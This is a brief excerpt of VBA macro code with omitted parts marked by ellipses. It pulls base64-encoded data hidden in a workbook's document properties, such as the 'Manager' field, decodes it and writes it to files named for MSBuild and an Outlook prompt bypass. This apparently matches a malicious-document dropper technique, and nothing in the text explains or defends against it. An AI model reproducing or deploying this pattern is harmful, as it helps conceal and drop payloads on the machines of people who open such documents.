...
oFile2.WriteLine Base64DecodeString(msbuild_outlook)
oFile2.Close
Set fso2 = Nothing
Set oFile2 = Nothing

msbuild_prompt_bypass = oWB.BuiltinDocumentProperties("Manager")
...
oFile3.WriteLine Base64DecodeString(msbuild_prompt_bypass)
oFile3.Close
Set fso3 = Nothing
Set oFile3 = Nothing
